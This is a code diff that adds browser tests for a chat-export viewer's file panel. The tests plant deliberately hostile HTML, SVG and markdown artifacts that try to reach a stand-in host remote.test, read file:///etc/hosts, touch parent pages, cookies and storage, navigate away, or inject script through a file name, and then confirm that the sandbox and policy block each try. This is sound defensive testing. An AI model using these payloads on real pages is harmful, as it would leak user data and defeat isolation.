@@ -145,6 +145,136 @@ function textChat() {
   ], '2026-01-02T00:00:00Z');
 }
 
+// A chat that makes each file with create_file, reported the way the exporter's replay reports them.
+// spec: { name, versions: [text], gone: true }. text '' means the export holds it as a binary.
+function filesChat(id, title, specs, updated) {
+  const messages = [], artifacts = {}, artifactIndex = {};
+  let n = 0, parent = null;
+  const push = (sender, content) => {
+    const uuid = `${id}-${n}`;
+    messages.push({ uuid, parent_message_uuid: parent, sender, created_at: `2026-03-01T10:${String(n % 60).padStart(2, '0')}:00Z`, content, attachments: [], files: [], files_v2: [] });
+    parent = uuid;
+    n++;
+    return uuid;
+  };
+  for (const spec of specs) {
+    const path = `/mnt/user-data/outputs/${spec.name}`;
+    if (spec.gone) {
+      push('human', [{ type: 'text', text: `show ${spec.name}` }]);
+      push('assistant', [{ type: 'text', text: 'Here it is.' }, { type: 'tool_use', id: `t${n}`, name: 'present_files', input: { filepaths: [path] } }]);
+      continue;
+    }
+    const dot = spec.name.lastIndexOf('.');
+    const fns = spec.versions.length > 1 ? spec.versions.map((_, i) => `${spec.name.slice(0, dot)}_v${i + 1}${spec.name.slice(dot)}`) : [spec.name];
+    const made = [];
+    spec.versions.forEach((text, i) => {
+      artifacts[fns[i]] = text;
+      push('human', [{ type: 'text', text: `make ${spec.name}` }]);
+      made.push(push('assistant', [{ type: 'text', text: `Made ${spec.name}.` }, { type: 'tool_use', id: `t${n}`, name: 'create_file', input: { path, file_text: text || 'bytes' } }]));
+    });
+    artifactIndex[path] = { path, filename: spec.name, versions: fns, messages: made };
+  }
+  return {
+    conversation: { uuid: id, name: title, model: 'claude-x', created_at: '2026-03-01T10:00:00Z', updated_at: updated, settings: {}, current_leaf_message_uuid: parent, chat_messages: messages },
+    ctx: { artifacts, artifactIndex },
+  };
+}
+
+// Reports through the console, which the test reads from outside the frame.
+const REPORT = "const report = (n, v) => console.log('ATTACK ' + n + ' ' + v);\ndocument.addEventListener('securitypolicyviolation', e => console.log('VIOLATION ' + e.violatedDirective + ' ' + e.blockedURI));";
+
+const ATTACKS = {
+  fetch: "fetch('https://remote.test/fetch').then(() => 'REACHED')",
+  xhr: "new Promise(done => { const x = new XMLHttpRequest(); x.onload = () => done('REACHED'); x.onerror = () => done('blocked'); x.open('GET', 'https://remote.test/xhr'); x.send(); })",
+  beacon: "navigator.sendBeacon('https://remote.test/beacon', 'x')",
+  websocket: "new Promise(done => { const w = new WebSocket('wss://remote.test/ws'); w.onopen = () => done('REACHED'); w.onerror = () => done('blocked'); })",
+  'remote-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'https://remote.test/img.png'; })",
+  'file-fetch': "fetch('file:///etc/hosts').then(() => 'REACHED')",
+  'file-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'file:///System/Library/Desktop%20Pictures/.thumbnails/x.png'; })",
+  'dynamic-import': "import('https://remote.test/mod.js').then(() => 'REACHED')",
+  'parent-document': "parent.document.title",
+  'parent-storage': "parent.localStorage.length",
+  'parent-location': "parent.location.href",
+  'top-location': "(top.location = 'https://remote.test/top', 'REACHED')",
+  'window-open': "window.open('https://remote.test/popup') ? 'REACHED' : 'blocked'",
+  'link-popup': "(document.getElementById('pop').click(), 'clicked')",
+  storage: "localStorage.length",
+  cookie: "document.cookie",
+};
+
+const HOSTILE_HTML = `<!doctype html><html><head><title>hostile</title>
+<link rel="stylesheet" href="https://remote.test/s.css">
+<style>@import url(https://remote.test/i.css); @font-face { font-family: f; src: url(https://remote.test/f.woff); } body { font-family: f; background: url(https://remote.test/bg.png); }</style>
+</head><body><h1>hostile</h1>
+<base href="https://remote.test/base/"><img src="relative.png">
+<img src="https://remote.test/tag.png"><video src="https://remote.test/v.mp4" autoplay></video>
+<iframe src="https://remote.test/frame"></iframe><object data="https://remote.test/obj"></object>
+<iframe srcdoc="<script>console.log('NESTED ran');fetch('https://remote.test/nested')<\/script>"></iframe>
+<a id="pop" href="https://remote.test/link" target="_blank">go</a>
+<script>${REPORT}
+const attempt = async (name, run) => {
+  report(name, 'ran');
+  try { report(name, 'gave ' + await run()); } catch (e) { report(name, 'threw ' + e.name); }
+};
+(async () => {
+  console.log('ATTACK origin ' + self.origin);
+${Object.entries(ATTACKS).map(([k, v]) => `  await attempt(${JSON.stringify(k)}, () => ${v});`).join('\n')}
+  report('finished', 'yes');
+})();
+</script></body></html>`;
+
+// What each attack must come to. sendBeacon says true once it has queued, and the policy stops it after that.
+const ATTACK_ENDS = {
+  fetch: 'threw TypeError', xhr: 'gave blocked', beacon: 'gave true', websocket: 'gave blocked', 'remote-img': 'gave blocked',
+  'file-fetch': 'threw TypeError', 'file-img': 'gave blocked', 'dynamic-import': 'threw TypeError',
+  'parent-document': 'threw SecurityError', 'parent-storage': 'threw SecurityError', 'parent-location': 'threw SecurityError',
+  'top-location': 'threw SecurityError', 'window-open': 'gave blocked', 'link-popup': 'gave clicked', storage: 'threw SecurityError', cookie: 'threw SecurityError',
+};
+
+// Each leaves the document it runs in, so each gets a file of its own. ran is logged before the attempt.
+const navArtifact = (name, attempt, head = '') => ({
+  name,
+  versions: [`<!doctype html><html><head>${head}</head><body>${name}<script>console.log('NAV ran ${name}');setTimeout(() => { ${attempt} }, 30);<\/script></body></html>`],
+});
+
+const ESCAPE_HTML = "<!doctype html><script>console.log('ESCAPED');fetch('https://remote.test/escaped')<\/script>";
+const MINIMAL_PDF = '%PDF-1.1\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n';
+const report = n => `<!doctype html><html><head><title>Report</title><style>h1{color:#b03a2e}</style></head><body><h1>Q3 budget summary</h1><p id="ver">report version ${n}</p><script>console.log('PREVIEW report ${n}')<\/script></body></html>`;
+const BAD_NAME = `x"><img src=x onerror=${HIT}>.py`;
+const NOTES_MD = `## Notes\n\nThe **variance** is $x^2$.\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\n<img src=x onerror="${HIT}">\n\n![remote](https://remote.test/md.png)\n`;
+
+function panelChat() {
+  return filesChat('files', 'Generated files', [
+    { name: 'report.html', versions: [report(1), report(2), report(3)] },
+    { name: 'single.html', versions: [report('only')] },
+    { name: 'notes.md', versions: [NOTES_MD] },
+    { name: 'hostile.html', versions: [HOSTILE_HTML] },
+    { name: 'uses-sibling.html', versions: ['<!doctype html><link href="./sibling.css" rel="stylesheet"><body><p id="s">before</p><script type="module" src=sibling.js></script></body>'] },
+    { name: 'sibling.js', versions: ["console.log('SIBLING ran $&');\ndocument.getElementById('s').textContent = 'changed by sibling';\nconst closing = '</script>';\nconsole.log('SIBLING after ' + closing);\n"] },
+    { name: 'sibling.css', versions: ['p { color: rgb(1, 2, 3); }'] },
+    { name: 'remote-lib.html', versions: ["<!doctype html><script src=\"https://remote.test/lib.js\"></script><script>console.log('REMOTE page ran')</script><p>uses a library</p>"] },
+    { name: 'drawing.svg', versions: ['<?xml version="1.0"?><!DOCTYPE svg PUBLIC "x" "y"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" onload="console.log(\'SVG ran\')"><circle r="20" cx="20" cy="20" fill="#c96442"/></svg>'] },
+    { name: 'tool.py', versions: [`print("<b>hi</b>")\n# <img src=x onerror=${HIT}>\n`] },
+    { name: 'Chart.jsx', versions: ['export default () => <div/>;\n'] },
+    { name: 'flow.mmd', versions: ['graph TD;\n  A-->B;\n'] },
+    { name: 'photo.png', versions: [''] },
+    { name: 'paper.pdf', versions: [''] },
+    { name: 'fake.pdf', versions: [''] },
+    { name: 'bundle.zip', versions: [''] },
+    { name: 'opaque.html', versions: [''] },
+    { name: 'gone.png', gone: true },
+    { name: BAD_NAME, versions: ['pass\n'] },
+    navArtifact('nav-https.html', "location.href = 'https://remote.test/nav';"),
+    navArtifact('nav-relative.html', "location.href = 'artefacts/escape.html';"),
+    navArtifact('nav-file.html', "location.href = new URL('artefacts/escape.html', document.baseURI).href;"),
+    navArtifact('nav-data.html', "location.href = 'data:text/html,<script>console.log(%22ESCAPED%22)<\\/script>';"),
+    navArtifact('nav-blob.html', "location.href = URL.createObjectURL(new Blob(['<script>console.log(\"ESCAPED\")<\\/script>'], { type: 'text/html' }));"),
+    navArtifact('nav-refresh.html', '', '<meta http-equiv="refresh" content="0;url=https://remote.test/refresh">'),
+    navArtifact('nav-form.html', "const f = document.createElement('form'); f.action = 'https://remote.test/form'; f.method = 'post'; document.body.append(f); f.submit();"),
+    navArtifact('nav-top-link.html', "const a = document.createElement('a'); a.href = 'https://remote.test/top-link'; a.target = '_top'; document.body.append(a); a.click();"),
+  ], '2026-06-01T00:00:00Z');
+}
+
 (async () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'takeout-viewer-'));
   const file = path.join(dir, 'viewer.html');
@@ -156,14 +286,14 @@ function textChat() {
   const open = async (options = {}, target = url) => {
     const context = await browser.newContext({ viewport: { width: 1360, height: 900 }, ...options });
     const page = await context.newPage();
-    const seen = { requests: [], errors: [] };
+    const seen = { requests: [], errors: [], logs: [], files: [] };
     await page.route('**/*', r => {
       const u = r.request().url();
-      if (u.startsWith('file:') || u.startsWith('data:')) return r.continue();
+      if (u.startsWith('file:') || u.startsWith('data:')) { seen.files.push(u); return r.continue(); }
       seen.requests.push(u);
       return r.abort();
     });
-    page.on('console', m => { if (m.type() === 'error') seen.errors.push(m.text()); });
+    page.on('console', m => { seen.logs.push(m.text()); if (m.type() === 'error') seen.errors.push(m.text()); });
     page.on('pageerror', e => seen.errors.push(e.message));
     await page.goto(target);
     await page.waitForSelector('.msg');
@@ -271,7 +401,7 @@ function textChat() {
     const keep = await open({}, url + '#chat=short&file=a.html&version=2');
     check('a hash opens its chat', (await keep.page.textContent('#title')) === 'Short chat');
     const keepHash = await keep.page.evaluate(() => location.hash);
-    check('file and version round-trip in the hash', /file=a\.html/.test(keepHash) && /version=2/.test(keepHash), keepHash);
+    check('an unknown file leaves the hash', !/file=|version=/.test(keepHash), keepHash);
     const badLeaf = await open({}, url + '#chat=short&leaf=nope');
     check('an unknown leaf still shows the chat', (await badLeaf.page.$$('.msg')).length === 2);
     await keep.page.click('.item:has-text("Quarterly")');
@@ -429,6 +559,238 @@ function textChat() {
     await phone.page.click('.item:has-text("Short chat")');
     check('phone: picking a chat closes the drawer', (await phone.page.textContent('#title')) === 'Short chat' && !(await phone.page.evaluate(() => document.body.classList.contains('drawer'))));
 
+    // The side panel.
+    const made = panelChat();
+    const pfile = path.join(dir, 'panel.html');
+    fs.mkdirSync(path.join(dir, 'artefacts'), { recursive: true });
+    fs.writeFileSync(path.join(dir, 'artefacts', 'photo.png'), Buffer.from(PNG.split(',')[1], 'base64'));
+    fs.writeFileSync(path.join(dir, 'artefacts', 'paper.pdf'), MINIMAL_PDF);
+    fs.writeFileSync(path.join(dir, 'artefacts', 'fake.pdf'), ESCAPE_HTML);
+    fs.writeFileSync(path.join(dir, 'artefacts', 'bundle.zip'), 'PK');
+    fs.writeFileSync(path.join(dir, 'artefacts', 'escape.html'), ESCAPE_HTML);
+    fs.writeFileSync(pfile, buildHtml([made.conversation, plainChat('other', 'Other chat', 2, '2026-01-01T00:00:00Z')], '2026-11-05T12:00:00Z', c => (c.uuid === 'files' ? made.ctx : {})));
+    const purl = 'file://' + pfile;
+    const card = name => `.art:has(b:text-is(${JSON.stringify(name)}))`;
+    const openFile = async (p, name, nth = 0) => {
+      await p.page.waitForSelector(card(name), { state: 'attached' });
+      await p.page.locator(card(name)).nth(nth).click();
+      await p.page.waitForSelector('#panel:not([hidden])');
+    };
+    const frameIn = async p => (await p.page.waitForSelector('#panel iframe', { state: 'attached' })).contentFrame();
+    const waitLog = async (p, text) => {
+      for (let i = 0; i < 60 && !p.seen.logs.some(l => l.includes(text)); i++) await p.page.waitForTimeout(50);
+      return p.seen.logs.some(l => l.includes(text));
+    };
+    const tabs = p => p.page.$$eval('#panel .tab', b => b.map(x => x.textContent));
+    const versions = p => p.page.$$eval('#panel .ver', b => b.map(x => x.textContent));
+    const note = p => p.page.$eval('#panel .file-note', n => n.textContent).catch(() => null);
+    const atHash = p => p.page.evaluate(() => location.hash);
+
+    // The counter has to be able to see what it is meant to catch.
+    const control = await open();
+    const ctrlPage = await control.context.newPage();
+    const ctrlSeen = [];
+    await ctrlPage.route('**/*', r => { ctrlSeen.push(r.request().url()); return r.abort(); });
+    await ctrlPage.setContent('<iframe srcdoc="<img src=https://remote.test/control.png>"></iframe>');
+    await ctrlPage.waitForTimeout(300);
+    check('control: a frame request with no policy is counted', ctrlSeen.includes('https://remote.test/control.png'), ctrlSeen.join());
+    // And the page the attacks aim for has to give itself away when it does load.
+    const ctrlEscape = await control.context.newPage();
+    const ctrlLogs = [];
+    ctrlEscape.on('console', m => ctrlLogs.push(m.text()));
+    await ctrlEscape.goto('file://' + path.join(dir, 'artefacts', 'escape.html'));
+    await ctrlEscape.waitForTimeout(150);
+    check('control: the escape page reports when it runs', ctrlLogs.includes('ESCAPED'), ctrlLogs.join());
+
+    const main = await open({}, purl);
+    const wide = await main.page.$eval('#panel', n => n.hidden);
+    check('no panel until a file is opened', wide);
+    const cardText = await main.page.$eval(card('report.html'), n => n.textContent);
+    check('a card shows its name and kind', cardText.includes('report.html') && cardText.includes('Document · HTML'), cardText);
+    check('a card with versions names its own', cardText.includes('v1'), cardText);
+    const scrolled = await main.page.evaluate(() => { const s = document.getElementById('scroll'); s.scrollTop = 200; document.querySelector('.msg').dataset.mark = 'kept'; return s.scrollTop; });
+    await main.page.evaluate(() => document.querySelector('.art').click());
+    await main.page.waitForSelector('#panel:not([hidden])');
+    check('a card opens the panel with its title', (await main.page.textContent('#panel .panel-title')) === 'report.html');
+    check('the panel names the kind', (await main.page.textContent('#panel .panel-kind')) === 'Document · HTML');
+    check('Preview and Code are offered', (await tabs(main)).join() === 'Preview,Code');
+    check('versions show when there are several', (await versions(main)).join() === 'v1,v2,v3', (await versions(main)).join());
+    check('the panel takes about 43% of a wide window', await main.page.$eval('#panel', n => Math.abs(n.getBoundingClientRect().width / innerWidth - 0.43) < 0.01));
+    check('the card version opens', /file=a1&version=0/.test(await atHash(main)), await atHash(main));
+    check('the open card is marked', await main.page.$$eval('.art', a => a.filter(x => x.classList.contains('on')).length === 1 && a[0].classList.contains('on')));
+    check('opening a file keeps the chat where it was', await main.page.evaluate(top => document.querySelector('.msg').dataset.mark === 'kept' && document.getElementById('scroll').scrollTop === top, scrolled));
+    const attrs = await main.page.$eval('#panel iframe', f => [...f.attributes].map(a => a.name).sort().join());
+    check('the frame has sandbox and srcdoc, and nothing that loosens them', attrs === 'class,sandbox,srcdoc,title', attrs);
+    check('sandbox is allow-scripts and nothing else', (await main.page.$eval('#panel iframe', f => f.getAttribute('sandbox'))) === 'allow-scripts');
+    const frame = await frameIn(main);
+    await frame.waitForSelector('#ver');
+    check('frame-src permits the srcdoc frame, and it runs', await waitLog(main, 'PREVIEW report 1'), main.seen.errors.join(' | '));
+    check('the file shows in the frame', (await frame.textContent('#ver')) === 'report version 1');
+    check('the card version is the one showing', !(main.seen.logs.some(l => l.includes('PREVIEW report 3'))));
+    check('the policy is the first thing in the frame', (await main.page.$eval('#panel iframe', f => f.srcdoc)).startsWith('<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '));
+    await main.page.click('#panel .ver:has-text("v2")');
+    check('a version button changes the file', await waitLog(main, 'PREVIEW report 2'));
+    check('a version button keeps the chat', await main.page.evaluate(top => document.querySelector('.msg').dataset.mark === 'kept' && document.getElementById('scroll').scrollTop === top, scrolled));
+    check('the open version is marked', (await main.page.textContent('#panel .ver.on')) === 'v2');
+    check('the hash follows the version', /file=a1&version=1/.test(await atHash(main)), await atHash(main));
+    check('the mark follows the version', await main.page.$$eval('.art', a => a.findIndex(x => x.classList.contains('on')) === 1));
+    await main.page.reload();
+    await main.page.waitForSelector('#panel iframe');
+    check('reload restores the file and version', (await (await frameIn(main)).textContent('#ver')) === 'report version 2');
+    check('reload restores the marked version', (await main.page.textContent('#panel .ver.on')) === 'v2');
+    check('reload marks the card', await main.page.waitForFunction(() => document.querySelectorAll('.art.on').length === 1, null, { timeout: 2000 }).then(() => true, () => false));
+    await main.page.click('#panel .tab:has-text("Code")');
+    const code = await main.page.$eval('#panel pre', n => ({ text: n.textContent, kids: n.childElementCount }));
+    check('Code shows the source as text', code.text === report(2) && code.kids === 0, JSON.stringify(code));
+    check('Code drops the frame', (await main.page.$$('#panel iframe')).length === 0);
+    await main.page.click('#panel .ver:has-text("v3")');
+    check('a version button stays in Code view', (await main.page.textContent('#panel pre')) === report(3));
+    await main.page.click('#panel .tab:has-text("Preview")');
+    check('Preview comes back', await waitLog(main, 'PREVIEW report 3'));
+    await main.page.click('#panel .close');
+    check('close hides the panel', await main.page.$eval('#panel', n => n.hidden));
+    check('close clears the file from the hash', !/file=/.test(await atHash(main)), await atHash(main));
+    check('close unmarks the card', (await main.page.$$('.art.on')).length === 0);
+    check('close leaves no frame behind', (await main.page.$$('iframe')).length === 0);
+    await openFile(main, 'single.html');
+    check('a single version has no version buttons', (await versions(main)).length === 0);
+    await openFile(main, 'report.html', 2);
+    await main.page.goBack();
+    await main.page.waitForFunction(() => document.querySelector('#panel .panel-title')?.textContent === 'single.html', null, { timeout: 2000 }).catch(() => {});
+    check('Back goes to the file before', (await main.page.textContent('#panel .panel-title')) === 'single.html');
+    await main.page.click('.item:has-text("Other chat")');
+    check('another chat closes the panel', await main.page.$eval('#panel', n => n.hidden));
+    clean('panel flow', main.seen);
+
+    const fbad = await open({}, purl + '#chat=files&file=__proto__&version=1');
+    check('a prototype name is not a file', await fbad.page.$eval('#panel', n => n.hidden));
+    check('an unknown file leaves the hash', !/file=|version=/.test(await atHash(fbad)), await atHash(fbad));
+    await fbad.page.evaluate(() => { location.hash = '#chat=files&file=constructor'; });
+    await fbad.page.waitForTimeout(100);
+    check('a built-in name is not a file', await fbad.page.$eval('#panel', n => n.hidden));
+    const far = await open({}, purl + '#chat=files&file=a1&version=99');
+    await far.page.waitForSelector('#panel iframe');
+    check('a version out of range shows the latest', (await far.page.textContent('#panel .ver.on')) === 'v3');
+    const swapped = await open({}, purl + '#chat=no-such-chat&leaf=files-1&file=a1&version=0');
+    check('an unknown chat drops leaf, file and version', await swapped.page.evaluate(() => !/leaf=files-1(&|$)|file=|version=/.test(location.hash) && document.getElementById('panel').hidden), await atHash(swapped));
+    check('an unknown chat still shows the newest', (await swapped.page.textContent('#title')) === 'Generated files');
+
+    const sib = await open({}, purl);
+    await openFile(sib, 'uses-sibling.html');
+    const sf = await frameIn(sib);
+    check('a sibling script runs', await waitLog(sib, 'SIBLING ran $&'), sib.seen.logs.join(' | '));
+    check('a closing tag in a sibling stays in it', await waitLog(sib, 'SIBLING after </script>'), sib.seen.logs.join(' | '));
+    check('a sibling script reaches the page', (await sf.textContent('#s')) === 'changed by sibling');
+    check('a sibling stylesheet applies', (await sf.$eval('#s', n => getComputedStyle(n).color)) === 'rgb(1, 2, 3)');
+    check('no note without a remote script', (await note(sib)) === null);
+    clean('sibling flow', sib.seen);
+
+    const rem = await open({}, purl);
+    await openFile(rem, 'remote-lib.html');
+    await frameIn(rem);
+    check('the page after a remote script still runs', await waitLog(rem, 'REMOTE page ran'));
+    check('a remote script is explained', (await note(rem)) === 'This file loads a script from the internet, which the viewer blocks, so it may not work here. Code view shows the full source.', await note(rem));
+    check('a remote script offers Code view', (await tabs(rem)).join() === 'Preview,Code');
+    check('a remote script is never requested', rem.seen.requests.length === 0, rem.seen.requests.join());
+
+    const kinds = await open({}, purl);
+    await openFile(kinds, 'tool.py');
+    check('.py has Code view and no Preview', (await tabs(kinds)).join() === 'Code', (await tabs(kinds)).join());
+    check('.py shows its source', (await kinds.page.textContent('#panel pre')).startsWith('print("<b>hi</b>")'));
+    for (const name of ['Chart.jsx', 'flow.mmd']) {
+      await openFile(kinds, name);
+      check(`${name} opens in Code view`, (await tabs(kinds)).join() === 'Code' && (await kinds.page.$$('#panel pre')).length === 1);
+      check(`${name} can't preview offline`, (await note(kinds)) === "This file type can't preview offline. Code view shows the full source.", await note(kinds));
+    }
+    await openFile(kinds, 'notes.md');
+    check('md renders as chat text does', (await kinds.page.$$('#panel .prose h2')).length === 1 && (await kinds.page.$$('#panel .prose .katex')).length === 1 && (await kinds.page.$$('#panel .prose .code')).length === 1);
+    check('md is sanitized', !(await kinds.page.evaluate(() => !!window.__hit)) && (await kinds.page.$$('#panel iframe, #panel script')).length === 0);
+    await kinds.page.click('#panel .copy');
+    await kinds.page.waitForFunction(() => document.querySelector('#panel .copy span').textContent === 'Copied');
+    check('md code blocks copy', true);
+    await openFile(kinds, 'drawing.svg');
+    check('an SVG runs in the sandbox', await waitLog(kinds, 'SVG ran'));
+    check('an SVG frame is sandboxed', (await kinds.page.$eval('#panel iframe', f => f.getAttribute('sandbox'))) === 'allow-scripts');
+    await openFile(kinds, 'photo.png');
+    await kinds.page.waitForFunction(() => document.querySelector('#panel img')?.naturalWidth > 0, null, { timeout: 2000 }).catch(() => {});
+    check('an image shows from its link', await kinds.page.$eval('#panel img', i => i.naturalWidth > 0).catch(() => false));
+    check('an image has no Code view', (await tabs(kinds)).join() === 'Preview', (await tabs(kinds)).join());
+    await openFile(kinds, 'paper.pdf');
+    const pdf = await kinds.page.$eval('#panel iframe', f => ({ sandboxed: f.hasAttribute('sandbox'), src: f.getAttribute('src'), srcdoc: f.hasAttribute('srcdoc') }));
+    check('a PDF uses a plain frame', !pdf.sandboxed && !pdf.srcdoc && pdf.src === 'artefacts/paper.pdf', JSON.stringify(pdf));
+    await kinds.page.waitForTimeout(400);
+    check('frame-src permits the PDF frame', kinds.seen.files.some(u => u.endsWith('/artefacts/paper.pdf')) && !kinds.seen.errors.some(e => /frame|Content Security Policy/i.test(e)), kinds.seen.errors.join(' | '));
+    await openFile(kinds, 'fake.pdf');
+    await kinds.page.waitForTimeout(500);
+    check('a page named .pdf does not run', !kinds.seen.logs.some(l => l.includes('ESCAPED')), kinds.seen.logs.join(' | '));
+    await openFile(kinds, 'bundle.zip');
+    const zip = await kinds.page.$eval('#panel a', a => ({ href: a.getAttribute('href'), target: a.target, rel: a.rel })).catch(() => null);
+    check('a binary offers an open link', zip && zip.href === 'artefacts/bundle.zip' && zip.target === '_blank' && zip.rel === 'noopener', JSON.stringify(zip));
+    check('a binary has no tabs', (await tabs(kinds)).length === 0);
+    await openFile(kinds, 'opaque.html');
+    check('an HTML file with no text gets no link', (await kinds.page.$$('#panel a, #panel iframe')).length === 0 && (await kinds.page.textContent('#panel-body')).includes("can't open"), await kinds.page.textContent('#panel-body'));
+    await openFile(kinds, 'gone.png');
+    check('a missing file says so', (await kinds.page.textContent('#panel-body')) === 'This file is not in this export.', await kinds.page.textContent('#panel-body'));
+    check('a missing file has no tabs or link', (await tabs(kinds)).length === 0 && (await kinds.page.$$('#panel a, #panel img')).length === 0);
+    check('a card says when a file is missing', (await kinds.page.textContent(card('gone.png'))).includes('Not in this export'));
+    await openFile(kinds, BAD_NAME);
+    check('a hostile file name stays text', (await kinds.page.textContent('#panel .panel-title')) === BAD_NAME && !(await kinds.page.evaluate(() => !!window.__hit)) && (await kinds.page.$$('#panel-head img, .art img')).length === 0);
+    check('no panel link ever points at a page', await kinds.page.$$eval('#panel a', a => a.every(x => !/\.(html?|svg|xhtml)$/i.test(x.getAttribute('href')))));
+    check('kinds flow makes no requests', kinds.seen.requests.length === 0, kinds.seen.requests.join());
+
+    // Hostile artifact: every attempt reports what happened to it from inside the frame.
+    const atk = await open({}, purl);
+    let popups = 0;
+    atk.context.on('page', () => { popups++; });
+    await openFile(atk, 'hostile.html');
+    const af = await frameIn(atk);
+    await af.waitForSelector('h1');
+    check('hostile: the script ran to the end', await waitLog(atk, 'ATTACK finished yes'), atk.seen.logs.filter(l => l.startsWith('ATTACK')).join(' | '));
+    check('hostile: the frame has no origin', atk.seen.logs.includes('ATTACK origin null'), atk.seen.logs.slice(0, 5).join(' | '));
+    for (const [name, end] of Object.entries(ATTACK_ENDS)) {
+      const said = atk.seen.logs.filter(l => l.startsWith(`ATTACK ${name} `)).map(l => l.slice(`ATTACK ${name} `.length));
+      check(`hostile: ${name} was attempted`, said[0] === 'ran', said.join());
+      check(`hostile: ${name} failed`, said[1] === end, said.join());
+    }
+    const violations = atk.seen.logs.filter(l => l.startsWith('VIOLATION'));
+    for (const url of ['https://remote.test/fetch', 'https://remote.test/beacon', 'wss://remote.test/ws', 'https://remote.test/img.png', 'https://remote.test/tag.png', 'https://remote.test/f.woff', 'https://remote.test/bg.png', 'https://remote.test/s.css']) {
+      check(`hostile: the policy stopped ${url}`, violations.some(v => v.endsWith(' ' + url)), violations.join(' | '));
+    }
+    check('hostile: a nested frame ran, and is held to the same policy', await waitLog(atk, 'NESTED ran') && await waitLog(atk, "Refused to connect to 'https://remote.test/nested'"), atk.seen.logs.filter(l => /nested/i.test(l)).join(' | '));
+    await atk.page.waitForTimeout(400);
+    check('hostile: no request left the page', atk.seen.requests.length === 0, atk.seen.requests.join());
+    check('hostile: no window opened', popups === 0, String(popups));
+    check('hostile: the viewer stays on its page', atk.page.url().startsWith(purl), atk.page.url());
+    check('hostile: the viewer title is untouched', (await atk.page.title()) === 'Generated files - Claude Takeout', await atk.page.title());
+    check('hostile: nothing ran in the viewer', !(await atk.page.evaluate(() => !!window.__hit)));
+
+    for (const name of ['nav-https.html', 'nav-relative.html', 'nav-file.html', 'nav-data.html', 'nav-blob.html', 'nav-refresh.html', 'nav-form.html', 'nav-top-link.html']) {
+      const nav = await open({}, purl);
+      let opened = 0;
+      nav.context.on('page', () => { opened++; });
+      await openFile(nav, name);
+      await frameIn(nav);
+      const ran = await waitLog(nav, `NAV ran ${name}`);
+      await nav.page.waitForTimeout(500);
+      check(`${name}: the attempt ran`, ran, nav.seen.logs.join(' | '));
+      check(`${name}: nothing got out`, !nav.seen.logs.some(l => l.includes('ESCAPED')) && nav.seen.requests.length === 0 && opened === 0, [...nav.seen.logs, ...nav.seen.requests].join(' | '));
+      check(`${name}: the viewer stays`, nav.page.url().startsWith(purl) && (await nav.page.title()) === 'Generated files - Claude Takeout', nav.page.url());
+      await nav.context.close();
+    }
+
+    const mid = await open({ viewport: { width: 900, height: 700 } }, purl);
+    await openFile(mid, 'report.html');
+    const midBox = await mid.page.evaluate(() => { const p = document.getElementById('panel').getBoundingClientRect(), m = document.getElementById('main').getBoundingClientRect(); return { covers: p.left <= m.left && p.right >= m.right, top: p.top, sideShown: document.getElementById('side').getBoundingClientRect().right === p.left }; });
+    check('narrow: the panel covers the chat', midBox.covers && midBox.top === 0 && midBox.sideShown, JSON.stringify(midBox));
+    const tiny = await open({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true }, purl);
+    await tiny.page.waitForSelector(card('report.html'));
+    await tiny.page.locator(card('report.html')).first().tap();
+    await tiny.page.waitForSelector('#panel:not([hidden])');
+    check('phone: the panel fills the screen', await tiny.page.$eval('#panel', n => { const r = n.getBoundingClientRect(); return r.left === 0 && r.right === innerWidth; }));
+    check('phone: no sideways scroll with the panel', await tiny.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
+    await tiny.page.tap('#panel .close');
+    check('phone: close returns to the chat', await tiny.page.$eval('#panel', n => n.hidden));
+
     if (process.env.SHOT_DIR) {
       const out = n => path.join(process.env.SHOT_DIR, n);
       for (const colorScheme of ['light', 'dark']) {
@@ -452,6 +814,29 @@ function textChat() {
         await p.page.click('#menu');
         await p.page.waitForTimeout(300);
         await p.page.screenshot({ path: out(`${colorScheme}-phone-drawer.png`) });
+        const ps = await open({ colorScheme }, purl);
+        await openFile(ps, 'report.html', 2);
+        await frameIn(ps);
+        await ps.page.waitForTimeout(200);
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-html.png`) });
+        await ps.page.click('#panel .tab:has-text("Code")');
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-code.png`) });
+        await openFile(ps, 'notes.md');
+        await ps.page.waitForTimeout(100);
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-md.png`) });
+        await openFile(ps, 'remote-lib.html');
+        await ps.page.waitForTimeout(200);
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-remote.png`) });
+        await openFile(ps, 'bundle.zip');
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-binary.png`) });
+        await openFile(ps, 'gone.png');
+        await ps.page.screenshot({ path: out(`${colorScheme}-panel-missing.png`) });
+        const pp = await open({ colorScheme, viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true, deviceScaleFactor: 2 }, purl);
+        await pp.page.waitForSelector(card('report.html'));
+        await pp.page.locator(card('report.html')).first().tap();
+        await pp.page.waitForSelector('#panel:not([hidden])');
+        await pp.page.waitForTimeout(200);
+        await pp.page.screenshot({ path: out(`${colorScheme}-phone-panel.png`) });
       }
     }
   } catch (e) {
